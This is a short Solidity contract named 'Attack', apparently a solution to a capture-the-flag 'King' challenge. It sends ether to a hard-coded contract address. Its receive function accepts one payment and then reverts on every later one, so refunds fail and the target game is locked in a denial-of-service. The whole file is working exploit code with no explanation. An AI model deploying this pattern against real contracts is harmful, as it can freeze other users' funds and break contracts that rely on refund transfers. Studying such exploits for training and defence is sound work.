// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";

contract Attack {
    bool public receivedOnce = false;

    function attackKing() public payable {
        payable(0xfC775FAE04b67B0B2D5406F39c0c73f28256005e).transfer(msg.value);
    }

    receive() external payable {
        require(receivedOnce == false);
        receivedOnce = true;
    }
}